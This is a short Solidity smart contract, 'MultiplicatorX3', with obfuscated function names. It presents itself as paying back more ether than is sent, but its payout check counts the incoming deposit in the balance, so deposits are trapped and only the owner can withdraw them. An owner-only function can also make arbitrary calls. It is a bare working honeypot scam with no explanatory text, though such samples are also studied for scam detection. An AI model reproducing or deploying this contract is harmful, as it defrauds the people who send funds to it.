// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public Owner = msg.sender;

    function() public payable{}

    function _0x35c668()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address _0x99b57a,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        _0x99b57a.call.value(msg.value)(data);
    }

    function _0x19c11d(address _0x99b57a)
    public
    payable
    {
        if(msg.value>=this.balance)
        {
            _0x99b57a.transfer(this.balance+msg.value);
        }
    }
}